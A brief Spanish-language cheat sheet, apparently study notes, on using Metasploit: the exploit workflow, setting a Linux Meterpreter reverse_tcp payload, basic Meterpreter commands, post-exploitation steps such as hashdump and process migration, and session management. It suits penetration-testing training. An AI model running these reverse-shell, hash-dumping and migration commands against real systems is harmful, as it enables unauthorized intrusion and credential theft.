## 🔹 3.1 Flujo correcto

msfconsole  
search <servicio>  
use <exploit>  
show options  
set RHOSTS target  
set LHOST tu_ip  
run

---

## 🔹 3.2 Payloads

show payloads  
set payload linux/x86/meterpreter/reverse_tcp

---

## 🔹 3.3 Meterpreter básico

sysinfo  
getuid  
shell

---

## 🔹 3.4 Post-explotación

hashdump        # hashes  
ps              # procesos  
migrate <pid>   # moverte a otro proceso

---

## 🔹 3.5 Background jobs

background  
sessions -l  
sessions -i 1

---

## ⚠️ Errores comunes

- No configurar bien `LHOST`
    
- No entender el payload
    
- No verificar vulnerabilidad antes